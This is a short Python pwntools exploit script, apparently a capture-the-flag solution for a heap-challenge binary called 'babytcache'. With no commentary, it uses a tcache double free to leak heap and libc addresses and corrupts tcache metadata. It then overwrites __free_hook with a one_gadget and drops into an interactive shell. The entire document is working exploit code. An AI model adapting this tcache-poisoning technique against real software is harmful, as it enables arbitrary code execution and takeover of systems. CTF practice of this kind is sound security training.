from pwn import *

def choose(choice):
	p.sendlineafter('>>', str(choice))

def add(index, size, data):
	choose(1)
	p.sendlineafter('Note index:', str(index))
	p.sendlineafter('Note size:', str(size))
	p.sendafter('Note data:', data)

def edit(index, data):
	choose(2)
	p.sendlineafter('Note index:', str(index))
	p.sendafter('Please update the data:', data)

def free(index):
	choose(3)
	p.sendlineafter('Note index:', str(index))

def view(index):
	choose(4)
	p.sendlineafter('Note index:', str(index))
	p.recvuntil('Your Note :')
	data = p.recvuntil('\n')
	return data[:-1]	

p = process('./babytcache')
# gdb.attach(p)

add(0, 0x200, 'AAAABBBB')
add(1, 0x200, 'CCCCDDDD')
free(1)
free(1)
heap_leak = u64(view(1) + '\x00\x00') -0x460
edit(1, p64(heap_leak))

add(3, 0x200, 'GGGGHHHH')
add(4, 0x200, p64(0x0)*3 + '\x00'*7 + '\x07')
add(5, 0x200, 'IIIIJJJJ')
add(6, 0x200, 'KKKKLLLL')
free(5)

libc_base = u64(view(5) + '\x00\x00')-0x3ebca0
free_hook = libc_base + 0x3ed8e8
one_gadget = libc_base + 0x4f322

edit(4, p64(0x0)*3 + '\x00'*7 + '\x00')
free(3)

edit(3, p64(free_hook))
add(7, 0x200, 'MMMMNNNN')
add(2, 0x200, p64(one_gadget))
free(6)
p.interactive()

